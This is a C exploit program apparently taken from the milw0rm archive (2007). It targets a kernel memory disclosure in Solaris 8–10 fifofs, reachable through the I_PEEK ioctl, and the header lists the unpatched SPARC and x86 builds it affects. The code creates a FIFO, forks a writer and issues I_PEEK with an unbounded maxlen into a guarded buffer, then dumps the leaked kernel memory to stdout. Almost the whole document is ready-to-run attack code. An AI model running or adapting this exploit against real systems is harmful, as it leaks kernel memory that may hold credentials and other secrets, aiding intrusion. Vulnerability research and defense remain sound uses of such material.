/* 10/2007: public release
 * SPARC
 *   Solaris  8 without 109454-06
 *   Solaris  9 without 117471-04
 *   Solaris 10 without 127737-01
 * x86
 *   Solaris  8 without 109455-06
 *   Solaris  9 without 117472-04
 *   Solaris 10 without 127738-01
 *
 * Solaris fifofs I_PEEK Kernel Memory Disclosure
 * By qaaz
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stropts.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>

#define PAGE_COUNT	1000

int	main(int argc, char *argv[])
{
	struct strpeek	strpeek;
	char		*buf, *end;
	int		pg = PAGE_COUNT, fd, pagesz, bufsz;

	fprintf(stderr,
		"---------------------------------------\n"
		" Solaris fifofs I_PEEK Kmem Disclosure\n"
		" By qaaz\n"
		"---------------------------------------\n");

	if (argc > 1) pg = atoi(argv[1]);

	pagesz = getpagesize();

	if (mknod("fifo", S_IFIFO | 0666, 0) < 0) {
		perror("mknod");
		return -1;
	}

	switch (fork()) {
	case -1:
		perror("fork");
		goto cleanup;
	case  0:
		if ((fd = open("fifo", O_WRONLY)) < 0) {
			perror("open");
			exit(0);
		}
		write(fd, "abcd", 4);
		exit(0);
		break;
	default:
		if ((fd = open("fifo", O_RDONLY)) < 0) {
			perror("open");
			goto cleanup;
		}
		break;
	}

	bufsz = (pg + 1) * pagesz;
	if (!(buf = memalign(pagesz, bufsz))) {
		perror("malloc");
		goto cleanup;
	}
	
	memset(buf, 0, bufsz);
	end = buf + (pg * pagesz);
	
	fprintf(stderr, "-> [ %p .. %p ]\n", buf, end);
	fflush(stderr);

	if (mprotect(end, pagesz, PROT_NONE) < 0) {
		perror("mprotect");
		goto cleanup;
	}

	memset(&strpeek, 0, sizeof(strpeek));
	strpeek.databuf.buf = buf;
	strpeek.databuf.maxlen = -1;
	if (ioctl(fd, I_PEEK, &strpeek) < 0) {
		perror("ioctl");
		goto cleanup;
	}

	while (end > buf && end[-1] == 0)
		end--;
	fprintf(stderr, "== %d\n", (int) (end - buf));
	fflush(stderr);

	if (!isatty(1))
		write(1, buf, (size_t) (end - buf));

cleanup:
	unlink("fifo");
	return 0;
}

// milw0rm.com [2007-10-10]
